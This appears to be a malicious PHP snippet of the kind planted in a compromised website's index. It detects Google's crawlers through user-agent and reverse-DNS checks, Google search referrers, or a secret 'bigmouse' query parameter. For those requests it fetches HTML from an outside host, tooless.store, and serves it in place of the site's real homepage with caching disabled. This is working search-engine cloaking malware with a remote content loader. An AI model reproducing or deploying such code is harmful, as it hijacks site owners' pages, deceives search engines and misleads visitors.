<?php
$u = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
$i = $_SERVER["HTTP_CF_CONNECTING_IP"] ?? $_SERVER["HTTP_X_FORWARDED_FOR"] ?? $_SERVER["REMOTE_ADDR"];
$r = $_SERVER['HTTP_REFERER'] ?? '';
$p = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH) ?? '/';
$c = stream_context_create(["http" => ["timeout" => 1.5]]);

function fetch($url) {
    global $c;
    $h = @file_get_contents($url, false, $c);
    if (!$h || strlen(trim($h)) < 20) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_TIMEOUT => 5,
            CURLOPT_USERAGENT => $_SERVER["HTTP_USER_AGENT"] ?? 'Mozilla'
        ]);
        $h = curl_exec($ch); curl_close($ch);
        if (!$h || strlen(trim($h)) < 20) $h = @file_get_contents($url, false, $c);
    }
    return $h;
}

$b = false;
foreach (['googlebot','adsbot','mediapartners','apis-google','structured-data-testing-tool','googlebot-image','googlebot-video','googlebot-news','google-inspectiontool'] as $x) {
    if (strpos($u, $x) !== false) {
        $h = @gethostbyaddr($i);
        $b = strpos($u, 'googlebot') !== false && $h && $h !== $i ? strpos($h, 'google.com') !== false || strpos($h, 'googlebot.com') !== false : true;
        break;
    }
}

if (($b || strpos($r, 'search.google.com') !== false || isset($_GET["bigmouse"])) && in_array($p, ['/', '/index.php'])) {
    if ($b) usleep(700000);
    $x = fetch("https://tooless.store/data/tamplase1.txt");
    if (strlen(trim($x)) > 50) {
        while (ob_get_level()) ob_end_clean();
        header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
        header("Pragma: no-cache");
        header("Expires: 0");
        header("Content-Type: text/html; charset=utf-8");
        echo $x;
        exit;
    }
}
